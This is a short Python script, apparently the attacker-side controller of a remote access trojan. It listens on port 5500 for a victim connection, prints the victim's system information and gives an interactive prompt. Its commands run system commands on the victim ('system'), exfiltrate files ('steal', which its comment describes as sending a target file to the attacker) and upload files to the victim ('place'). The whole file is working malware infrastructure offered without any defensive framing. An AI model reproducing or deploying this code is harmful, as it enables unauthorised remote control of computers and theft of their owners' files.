from socket import *
from time import sleep

HOST = ""
PORT = 5500

def steal(sock, path):
	file = open(path, "wb")
	end = "end".encode()

	f = sock.recv(1024)
	while f != end:
		file.write(f)
		f = sock.recv(1024)
	file.close()	



def place(sock, path):
	

	file = open(path, "rb")

	print("read", path)
	
	f = file.read(1024)

	while f:
		sock.send(f)
		f = file.read(1024)
	
	file.close()
	sleep(0.2)

	sock.send("end".encode())
	



def listen():
	s = socket(AF_INET, SOCK_STREAM)
	s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
	s.bind((HOST, PORT))
	print("[*] Listening on port %s" % str(PORT))
	s.listen(10)
	sock, addr = s.accept()
	return sock

def main():
	sock = listen()
	data = sock.recv(1024).decode() # recv system info
	print(data)
	
	while sock:
		data = input("[>] ")

		if data != "":
			action = data.split()[0]
			response = b"[!] No response"

			if action == "system":
				sock.send(data.encode())
				response = sock.recv(1024)
			

			# will open a file on target and send it to attacker
			# usage: steal /path/on/victim /path/on/attacker	
			elif action == "steal":
				sock.send(data.encode())
				path = data.split()[2]
				steal(sock, path)
				response = b"[+] file received"
				
			# will send a file from attacker to victim
			# usage place /path/on/victim /path/on/attacker
			elif action == "place":
				sock.send(data.encode())
				path = data.split()[1]
				place(sock, path)
				response = b"[+] file sent"
			else:
				pass

			print(response.decode())

		else:
			pass

main()
